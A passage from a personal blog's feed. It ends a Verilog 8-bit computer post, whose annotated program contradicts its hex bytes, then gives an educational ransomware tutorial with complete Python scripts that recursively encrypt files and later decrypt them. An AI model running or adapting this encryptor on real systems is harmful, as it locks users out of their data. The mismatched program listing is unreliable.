</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">initial</span> <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>        $dumpfile(<span style="color:#e6db74">&#34;top_design_tb.vcd&#34;</span>);
</span></span><span style="display:flex;"><span>        $dumpvars(<span style="color:#ae81ff">0</span>, top_design_tb);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// pulse reset signal
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        rst <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        #<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        rst <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// multiplexer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] bus_en <span style="color:#f92672">=</span> {pc_en, mem_en, ir_en, a_en, adder_en};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">reg</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] bus;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">always</span> @ (<span style="color:#f92672">*</span>) 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> (bus_en)
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">5</span><span style="color:#ae81ff">&#39;b00001</span><span style="color:#f92672">:</span> bus <span style="color:#f92672">=</span> adder_out;
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">5</span><span style="color:#ae81ff">&#39;b00010</span><span style="color:#f92672">:</span> bus <span style="color:#f92672">=</span> a_out;
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">5</span><span style="color:#ae81ff">&#39;b00100</span><span style="color:#f92672">:</span> bus <span style="color:#f92672">=</span> ir_out;
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">5</span><span style="color:#ae81ff">&#39;b01000</span><span style="color:#f92672">:</span> bus <span style="color:#f92672">=</span> mem_out;
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">5</span><span style="color:#ae81ff">&#39;b10000</span><span style="color:#f92672">:</span> bus <span style="color:#f92672">=</span> pc_out;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span> bus <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span><span style="color:#ae81ff">&#39;b0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">endcase</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// clock signal
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">reg</span> clk_in <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">integer</span> i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">initial</span> <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">128</span>; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>            #<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>            clk_in <span style="color:#f92672">=</span> <span style="color:#f92672">~</span>clk_in;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> clk;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> hlt;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">reg</span> rst;
</span></span><span style="display:flex;"><span>    clock clock(
</span></span><span style="display:flex;"><span>        .hlt(hlt),
</span></span><span style="display:flex;"><span>        .clk_in(clk_in),
</span></span><span style="display:flex;"><span>        .clk_out(clk)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> pc_inc;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> pc_en;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] pc_out;
</span></span><span style="display:flex;"><span>    pc pc(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .inc(pc_inc),
</span></span><span style="display:flex;"><span>        .out(pc_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> mar_load;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> mem_en;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] mem_out;
</span></span><span style="display:flex;"><span>    memory mem(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .load(mar_load),
</span></span><span style="display:flex;"><span>        .bus(bus),
</span></span><span style="display:flex;"><span>        .out(mem_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> a_load;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> a_en;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] a_out;
</span></span><span style="display:flex;"><span>    reg_a reg_a(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .load(a_load),
</span></span><span style="display:flex;"><span>        .bus(bus),
</span></span><span style="display:flex;"><span>        .out(a_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> b_load;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] b_out;
</span></span><span style="display:flex;"><span>    reg_b reg_b(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .load(b_load),
</span></span><span style="display:flex;"><span>        .bus(bus),
</span></span><span style="display:flex;"><span>        .out(b_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> adder_sub;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> adder_en;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] adder_out;
</span></span><span style="display:flex;"><span>    adder adder(
</span></span><span style="display:flex;"><span>        .a(a_out),
</span></span><span style="display:flex;"><span>        .b(b_out),
</span></span><span style="display:flex;"><span>        .sub(adder_sub),
</span></span><span style="display:flex;"><span>        .out(adder_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> ir_load;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> ir_en;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] ir_out;
</span></span><span style="display:flex;"><span>    ir ir(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .load(ir_load),
</span></span><span style="display:flex;"><span>        .bus(bus),
</span></span><span style="display:flex;"><span>        .out(ir_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    controller controller(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .opcode(ir_out[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span>]),
</span></span><span style="display:flex;"><span>        .out(
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            hlt,
</span></span><span style="display:flex;"><span>            pc_inc,
</span></span><span style="display:flex;"><span>            pc_en,
</span></span><span style="display:flex;"><span>            mar_load,
</span></span><span style="display:flex;"><span>            mem_en,
</span></span><span style="display:flex;"><span>            ir_load,
</span></span><span style="display:flex;"><span>            ir_en,
</span></span><span style="display:flex;"><span>            a_load,
</span></span><span style="display:flex;"><span>            a_en,
</span></span><span style="display:flex;"><span>            b_load,
</span></span><span style="display:flex;"><span>            adder_sub,
</span></span><span style="display:flex;"><span>            adder_en
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endmodule</span>
</span></span></code></pre></div><h2 id="the-program">The program</h2>
<p>Finally, to program the computer, we can program the bytes directly into a file named <code>program.bin</code>. This file will get loaded into the memory module when the computer starts. Here&rsquo;s an example program:</p>
<pre tabindex="0"><code class="language-bin" data-lang="bin">0D 2E 1F F0 00 00 00 00 00 00 00 00 00 05 04 02
</code></pre><p>This is the annotated version of the example program:</p>
<pre tabindex="0"><code class="language-bin" data-lang="bin">$0      0D      // LDA $D   Load A with the value at address $D
$1      1E      // ADD $E   Add the value at address $E to A
$2      2F      // SUB $F   Subtract the value at address $F from A
$3      F0      // HLT      Stop execution
$4      00      // Padding byte
$5      00      // Padding byte
$6      00      // Padding byte
$7      00      // Padding byte
$8      00      // Padding byte
$9      00      // Padding byte
$A      00      // Padding byte
$B      00      // Padding byte
$C      00      // Padding byte
$D      05      // Data
$E      04      // Data
$F      02      // Data
</code></pre><p>And after all of that, we have the end result, a functioning 8-bit computer:</p>
<p><img src="/img/8bit-computer/8bit-computer-waveforms.png" alt="8bit computer waveforms"></p>
<p>We can see that the data in <em>reg_a</em> is getting added and subtracted with the data in <em>reg_b</em> just like how we programmed it in <code>program.bin</code>.</p>
<blockquote>
<p>You can find the source code <a href="https://github.com/namberino/fpga-computer/tree/8bit">here</a>.</p></blockquote>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.youtube.com/playlist?list=PLowKtXNTBypGqImE405J2565dvjafglHU">Ben Eater&rsquo;s 8-bit computer series</a></li>
<li><a href="https://www.amazon.com/Digital-Computer-Electronics-Jerald-Malvino-dp-0074622358/dp/0074622358/ref=dp_ob_title_bk">Digital Computer Electronics</a></li>
<li><a href="https://drive.google.com/file/d/17fH-JBU5OX_4AG123AO47y879YxzmDwX/view">SAP-1 Implementation Report</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>The world&#39;s most harmless ransomware</title>
            <link>https://namberino.github.io/posts/2024/02/the-worlds-most-harmless-ransomware/</link>
            <pubDate>Fri, 23 Feb 2024 17:37:37 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/02/the-worlds-most-harmless-ransomware/</guid>
            <description>&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;: Please do &lt;strong&gt;NOT&lt;/strong&gt; use this for malicious intent. This is purely for educational purpose only. If you do want to run this ransomware, run it in an isolated environment. &lt;strong&gt;STAY SAFE AND DON&amp;rsquo;T GET IN TROUBLE!&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Ever since I started watching &lt;em&gt;Mr. Robot&lt;/em&gt;, I got really interested in hacking and hackers. I&amp;rsquo;m not a hacker myself but I do like learning about how people have found ways to exploit computers.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<blockquote>
<p><strong>Disclaimer</strong>: Please do <strong>NOT</strong> use this for malicious intent. This is purely for educational purpose only. If you do want to run this ransomware, run it in an isolated environment. <strong>STAY SAFE AND DON&rsquo;T GET IN TROUBLE!</strong></p></blockquote>
<p>Ever since I started watching <em>Mr. Robot</em>, I got really interested in hacking and hackers. I&rsquo;m not a hacker myself but I do like learning about how people have found ways to exploit computers.</p>
<p>One type of exploit that caught my eyes is <em>ransomware</em>. The idea that a program can just encrypt your computer with all your files and make you pay to get them back is both terrifying and fascinating.</p>
<p>When I was learning about how ransomware attacks work, I decided to try making a simple (and rather harmless) ransomware myself to understand them better. So let&rsquo;s learn about ransomware by making one!</p>
<hr>
<h2 id="the-concept">The concept</h2>
<p>A ransomware will encrypt the files on the victim&rsquo;s machine and will decrypt the files once the attacker allows it to (usually after the victim has paid some money).</p>
<p>So we need a way to find all the files on a machine, encrypt them with a key, and then later on, decrypt those files with the same key we used to encrypt them.</p>
<hr>
<h2 id="the-environment">The environment</h2>
<p>For this project, we will use a cryptography library to be able to encrypt and decrypt the files. I opted for a library called <code>cryptography</code> and we can install this by using <code>pip</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install cryptography
</span></span></code></pre></div><hr>
<h2 id="the-encryption">The encryption</h2>
<p>So, how do we encrypt all the files on a machine? First of all, we need to find all the files on a machine. To do this, we can use the <code>os</code> library. We&rsquo;ll also use the cryptography library we just installed for encryption.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.fernet <span style="color:#f92672">import</span> Fernet
</span></span></code></pre></div><p>We will find all the files and put them into a list called <code>files</code>.</p>
<p>We will need to check whether a &lsquo;file&rsquo; is a directory or a file, we can use <code>os.path.isfile()</code> to check it. If the &lsquo;file&rsquo; is not a file and is a directory, we can go into that directory recursively find all the files within that directory.</p>
<p>After we&rsquo;re finished with looking through a directory, we can go out of the directory and save the relative path to the file we found.</p>
<p>We also want to avoid our encryption and decryption files along with our key file that will later save our decryption key.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># bill-cipher.py</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_files</span>():
</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir():
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-cipher.py&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;.a_deal&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
</span></span><span style="display:flex;"><span>			files<span style="color:#f92672">.</span>append(file)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(file)
</span></span><span style="display:flex;"><span>			sub_files <span style="color:#f92672">=</span> find_files()
</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(<span style="color:#e6db74">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> subfile <span style="color:#f92672">in</span> sub_files:
</span></span><span style="display:flex;"><span>				path <span style="color:#f92672">=</span> file <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> subfile
</span></span><span style="display:flex;"><span>				files<span style="color:#f92672">.</span>append(path)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> files
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> find_files()
</span></span></code></pre></div><p>Now we need a key to encrypt the files with.</p>
<p>This key will be saved in a file named <code>.a_deal</code> because dotfiles will be hidden on Linux systems.</p>
<p>After we generated the key, we want to open all the files, read their contents, encrypt the contents, then write all of the encrypted contents back into the files.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>key <span style="color:#f92672">=</span> Fernet<span style="color:#f92672">.</span>generate_key()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;.a_deal&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> deal:
</span></span><span style="display:flex;"><span>	deal<span style="color:#f92672">.</span>write(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	content_encrypted <span style="color:#f92672">=</span> Fernet(key)<span style="color:#f92672">.</span>encrypt(content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>write(content_encrypted)
</span></span></code></pre></div><p>So the complete encryption program (<code>bill-cipher.py</code>) will look something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/local/bin/python3 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.fernet <span style="color:#f92672">import</span> Fernet
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_files</span>():
</span></span><span style="display:flex;"><span>	files <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir():
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-cipher.py&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;.a_deal&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
</span></span><span style="display:flex;"><span>			files<span style="color:#f92672">.</span>append(file)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(file)
</span></span><span style="display:flex;"><span>			sub_files <span style="color:#f92672">=</span> find_files()
</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(<span style="color:#e6db74">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> subfile <span style="color:#f92672">in</span> sub_files:
</span></span><span style="display:flex;"><span>				path <span style="color:#f92672">=</span> file <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> subfile
</span></span><span style="display:flex;"><span>				files<span style="color:#f92672">.</span>append(path)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> files
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> find_files()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(files)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> Fernet<span style="color:#f92672">.</span>generate_key()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;.a_deal&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> deal:
</span></span><span style="display:flex;"><span>	deal<span style="color:#f92672">.</span>write(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	content_encrypted <span style="color:#f92672">=</span> Fernet(key)<span style="color:#f92672">.</span>encrypt(content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>write(content_encrypted)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Files are encrypted! Send me moneyyyyyyyyyyyyyyy&#34;</span>)
</span></span></code></pre></div><p>Now, if we run <code>bill-cipher.py</code>, we can see that all the files that this program can get its hand on becomes a jumble of illegible letters.</p>
<p><img src="/img/harmless-ransomware/file1-encrypted.png" alt="file1-encrypted"></p>
<p>Even the image files become unreadable.</p>
<p><img src="/img/harmless-ransomware/pic-encrypted.png" alt="pic-encrypted"></p>
<p>So now that we have the files encrypted, we need some way to decrypt it.</p>
<hr>
<h2 id="the-decryption">The decryption</h2>
<p>In order to decrypt it, we need to do the exact same thing as when we encrypted the files but a little different.</p>
<p>Instead of creating a new key, we read the key from <code>.a_deal</code> because this is the key that was used to encrypt the files.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;.a_deal&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> deal:
</span></span><span style="display:flex;"><span>	key <span style="color:#f92672">=</span> deal<span style="color:#f92672">.</span>read()
</span></span></code></pre></div><p>When we read each of the files, we need to use the key that we read from <code>.a_deal</code> to decrypt it instead of encrypting it like we did before.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	content_decrypted <span style="color:#f92672">=</span> Fernet(key)<span style="color:#f92672">.</span>decrypt(content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>write(content_decrypted)
</span></span></code></pre></div><p>So the complete decryption program (<code>bill-decipher.py</code>) will look a bit something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/local/bin/python3 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.fernet <span style="color:#f92672">import</span> Fernet
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_files</span>():
</span></span><span style="display:flex;"><span>	files <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir():
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-cipher.py&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;.a_deal&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
</span></span><span style="display:flex;"><span>			files<span style="color:#f92672">.</span>append(file)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(file)
</span></span><span style="display:flex;"><span>			sub_files <span style="color:#f92672">=</span> find_files()
</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(<span style="color:#e6db74">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> subfile <span style="color:#f92672">in</span> sub_files:
</span></span><span style="display:flex;"><span>				path <span style="color:#f92672">=</span> file <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> subfile
</span></span><span style="display:flex;"><span>				files<span style="color:#f92672">.</span>append(path)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> files
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> find_files()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(files)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;.a_deal&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> deal:
</span></span><span style="display:flex;"><span>	key <span style="color:#f92672">=</span> deal<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	content_decrypted <span style="color:#f92672">=</span> Fernet(key)<span style="color:#f92672">.</span>decrypt(content)
</span></span><span style="display:flex;"><span>
